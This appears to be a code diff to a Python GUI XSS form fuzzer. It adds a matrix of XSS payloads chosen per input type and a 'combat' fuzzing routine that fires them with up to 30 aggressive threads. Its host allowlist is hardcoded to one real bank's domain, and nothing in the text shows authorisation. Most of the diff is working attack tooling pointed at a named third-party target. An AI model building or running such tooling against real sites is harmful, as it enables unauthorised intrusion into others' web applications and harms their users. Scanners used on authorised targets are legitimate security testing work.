@@ -11,6 +11,53 @@ from concurrent.futures import ThreadPoolExecutor, as_completed, Future
 from xss_security_gui.form_fuzzer import fuzz_form
 from xss_security_gui.utils.threat_sender import ThreatSenderMixin
 from xss_security_gui.utils.core_utils import normalize_url
+from xss_security_gui.utils.ui_queue_bridge import UIQueueBridge
+from xss_security_gui.utils.ai_bridge import analyze_async
+
+PAYLOAD_MATRIX = {
+    "text": [
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "'\"><svg/onload=alert(1)>"
+    ],
+    "search": [
+        "<script>alert('search')</script>",
+        "\"><img src=x onerror=alert('search')>"
+    ],
+    "email": [
+        "test@example.com\"><img src=x onerror=alert('email')>",
+        "\" onfocus=alert('email') \""
+    ],
+    "password": [
+        "\" autofocus onfocus=alert('pwd') \"",
+        "' onkeyup=alert('pwd') '"
+    ],
+    "textarea": [
+        "<script>alert('textarea')</script>",
+        "</textarea><script>alert('break')</script>"
+    ],
+    "comment": [
+        "<!--><script>alert('comment')</script>"
+    ],
+    "default": [
+        "<script>alert('x')</script>",
+        "\"><img src=x onerror=alert('x')>"
+    ]
+}
+
+def select_payloads_for_input(inp: Dict[str, Any]) -> List[str]:
+    name = (inp.get("name") or "").lower()
+    type_ = (inp.get("type") or "").lower()
+
+    # Пріоритет: type → name → default
+    if type_ in PAYLOAD_MATRIX:
+        return PAYLOAD_MATRIX[type_]
+
+    for key in PAYLOAD_MATRIX:
+        if key in name:
+            return PAYLOAD_MATRIX[key]
+
+    return PAYLOAD_MATRIX["default"]
 
 
 class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
@@ -24,6 +71,7 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
         self.is_fuzzing = False
         self.fuzzing_thread: Optional[threading.Thread] = None
         self.executor: Optional[ThreadPoolExecutor] = None
+        self._bridge = UIQueueBridge(self, poll_ms=50)
         
         # Агрессивные настройки по умолчанию
         self.max_workers = 30  # Больше потоков для агрессивного фуззинга
@@ -108,21 +156,14 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
         def _log():
             self.result_box.insert("end", text + "\n", tag)
             self.result_box.see("end")
-        
-        if threading.current_thread() == threading.main_thread():
-            _log()
-        else:
-            self.after(0, _log)
+        self._bridge.call_ui(_log)
 
     def update_status(self, text: str):
         """Обновление статуса"""
         def _update():
             self.status_label.config(text=text)
         
-        if threading.current_thread() == threading.main_thread():
-            _update()
-        else:
-            self.after(0, _update)
+        self._bridge.call_ui(_update)
 
     def clear_results(self):
         """Очистка результатов"""
@@ -185,6 +226,7 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
 
             for form in forms:
                 if not isinstance(form, dict):
+                    self.log(f"⚠️ Пропущена невалидная форма #{form.get('id', 'unknown')}", "warning")
                     continue
                 
                 inputs = form.get("inputs", [])
@@ -235,8 +277,7 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
         
         # Запускаем в отдельном потоке
         self.is_fuzzing = True
-        self.fuzzing_thread = threading.Thread(target=self._fuzz_all_forms_thread, daemon=True)
-        self.fuzzing_thread.start()
+        self.fuzzing_thread = self._bridge.post_bg(self._fuzz_all_forms_thread)
 
     def stop_fuzzing(self):
         """Остановка фуззинга"""
@@ -258,8 +299,8 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
         self.log(f"⚙️ Настройки: {self.max_workers} потоков, таймаут {self.timeout}s, агрессивный режим: {self.aggressive_mode}", "info")
         self.log("=" * 80, "info")
         
-        self.progress['maximum'] = total_forms
-        self.progress['value'] = 0
+        self._bridge.post_ui(self.progress.configure, maximum=total_forms)
+        self._bridge.post_ui(self.progress.configure, value=0)
         
         all_hits = []
         processed = 0
@@ -295,14 +336,14 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
                                 self.send_to_threat_intel("form_fuzzer", [hit])
                     
                     processed += 1
-                    self.progress['value'] = processed
+                    self._bridge.post_ui(self.progress.configure, value=processed)
                     self.update_status(f"Обработано: {processed}/{total_forms} | Найдено XSS: {len(all_hits)}")
                     
                 except Exception as e:
                     errors += 1
                     self.log(f"❌ Ошибка при обработке формы {form.get('url', 'unknown')}: {e}", "error")
                     processed += 1
-                    self.progress['value'] = processed
+                    self._bridge.post_ui(self.progress.configure, value=processed)
         
         self.executor = None
         self.is_fuzzing = False
@@ -318,67 +359,131 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
         self.update_status(f"Завершено: {processed} форм, {len(all_hits)} XSS найдено")
         
         if all_hits:
-            messagebox.showinfo("✅ Результаты", f"Найдено {len(all_hits)} XSS уязвимостей!\nПроверьте логи для деталей.")
+            self._bridge.post_ui(
+                messagebox.showinfo,
+                "✅ Результаты",
+                f"Найдено {len(all_hits)} XSS уязвимостей!\nПроверьте логи для деталей.",
+            )
 
     def _fuzz_single_form(self, form: Dict[str, Any], idx: int, total: int) -> List[Dict[str, Any]]:
-        """Фуззинг одной формы"""
+        """Фуззинг одной формы (боевой, с вайтлистом, маршрутом payload‑ов и осмысленным логированием)"""
         try:
-            action = form.get("action", "")
-            base_url = form.get("url", "")
-            
-            # Формируем полный URL
+            base_url = form.get("url", "").strip()
+            action = (form.get("action") or "").strip()
+
+            if not base_url:
+                return []
+
+            # --- Вайтлист по хосту ---
+            from urllib.parse import urlparse
+            allowed_hosts = {
+                "gazprombank.ru",
+                # добавляй свои разрешённые цели
+            }
+            host = urlparse(base_url).hostname
+            if host not in allowed_hosts:
+                self.log(f"⚠️ Пропуск формы: хост {host} не в вайтлисте", "warning")
+                return []
+
+            # --- Формируем полный URL ---
             if action.startswith(("http://", "https://")):
                 full_url = action
             elif action.startswith("/"):
                 full_url = base_url.rstrip("/") + action
             else:
-                full_url = base_url.rstrip("/") + "/" + action if action else base_url
-            
+                full_url = base_url.rstrip("/") + ("/" + action if action else "")
+
             full_url = normalize_url(full_url)
-            
+
             inputs = form.get("inputs", [])
             if not inputs:
+                self.log(f"⚠️ Форма без полей, пропуск: {full_url}", "warning")
                 return []
-            
-            method = form.get("method", "GET")
-            
-            # Определяем подозрительные поля
-            suspicious = [
-                i for i in inputs 
-                if any(x in i.lower() for x in ["query", "search", "msg", "comment", "text", "input", "data", "content"])
-            ]
-            
-            # Логируем информацию о форме
+
+            # --- Генерация пер‑параметрного маршрута payload‑ов ---
+            param_payloads = {}
+            for inp in inputs:
+                if not isinstance(inp, dict):
+                    continue
+                name = inp.get("name")
+                if not name:
+                    continue
+                param_payloads[name] = select_payloads_for_input(inp)
+
+            # Логируем маршрут
+            self.log("🧬 Маршрут payload‑ов:", "info")
+            for k, v in param_payloads.items():
+                self.log(f"   • {k}: {len(v)} payload‑ов", "info")
+
+            method = (form.get("method") or "GET").upper()
+
+            # --- Определяем подозрительные поля ---
+            suspicious: List[Dict[str, Any]] = []
+            for inp in inputs:
+                if not isinstance(inp, dict):
+                    continue
+                name = (inp.get("name") or "").lower()
+                type_ = (inp.get("type") or "").lower()
+                haystack = f"{name} {type_}"
+                if any(x in haystack for x in
+                       ["query", "search", "msg", "comment", "text", "input", "data", "content"]):
+                    suspicious.append(inp)
+
+            # --- Логируем информацию о форме ---
             self.log(f"\n📨 [{idx}/{total}] {method} {full_url}", "info")
             self.log(f"🔧 Параметры: {inputs}", "info")
             if suspicious:
                 self.log(f"⚠️ Подозрительные поля: {suspicious}", "warning")
             if form.get("handlers") and form.get("handlers") != "—":
                 self.log(f"🧠 JS обработчики: {form['handlers']}", "info")
-            
-            # Запускаем фуззинг с агрессивными настройками
+
+            # --- Боевые настройки ---
+            max_workers = self.max_workers if self.aggressive_mode else min(self.max_workers, 10)
+            timeout = self.timeout
+
+            # --- Запускаем фуззинг ---
             results = fuzz_form(
                 action_url=full_url,
                 method=method,
                 inputs=inputs,
-                max_workers=self.max_workers if self.aggressive_mode else 10,
-                timeout=self.timeout,
-                allowlist=None  # Можно добавить проверку allowlist
+                param_payloads=param_payloads,
+                max_workers=max_workers,
+                timeout=timeout,
+                allowlist=None
             )
-            
+
             hits = [r for r in results if r.get("vulnerable")]
-            
+
             if hits:
                 for hit in hits:
                     payload = hit.get("payload", "")
                     category = hit.get("category", "❓")
                     status = hit.get("status", "?")
-                    self.log(f"  ✔️ XSS НАЙДЕН: {payload[:60]}... [{category}] Status: {status}", "xss")
+                    self.log(f"  ✔️ XSS НАЙДЕН: {payload[:80]}... [{category}] Status: {status}", "xss")
+
+                    # AI-анализ
+                    try:
+                        def make_ai_cb(h):
+                            def _ai_cb(res):
+                                try:
+                                    summary = res.get("summary") if isinstance(res, dict) else str(res)
+                                    conf = res.get("confidence", "?") if isinstance(res, dict) else "?"
+                                    text = f"[AI] {summary} -- confidence={conf}\n"
+                                    self._bridge.post_ui(self.result_box.insert, "end", text)
+                                    self._bridge.post_ui(self.result_box.see, "end")
+                                except Exception:
+                                    pass
+
+                            return _ai_cb
+
+                        analyze_async(hit, callback=make_ai_cb(hit), name="FormFuzzerAI")
+                    except Exception:
+                        pass
             else:
                 self.log(f"  ❌ Уязвимость не найдена", "info")
-            
+
             return hits
-            
+
         except Exception as e:
             self.log(f"  ❌ Ошибка при фуззинге формы: {e}", "error")
             return []
@@ -447,3 +552,16 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
         except Exception as e:
             self.log(f"❌ Ошибка экспорта: {e}", "error")
             messagebox.showerror("Ошибка", f"Не удалось экспортировать результаты:\n{e}")
+
+    def destroy(self):
+        self.is_fuzzing = False
+        if self.executor:
+            try:
+                self.executor.shutdown(wait=False, cancel_futures=True)
+            except Exception:
+                pass
+        try:
+            self._bridge.stop()
+        except Exception:
+            pass
+        super().destroy()
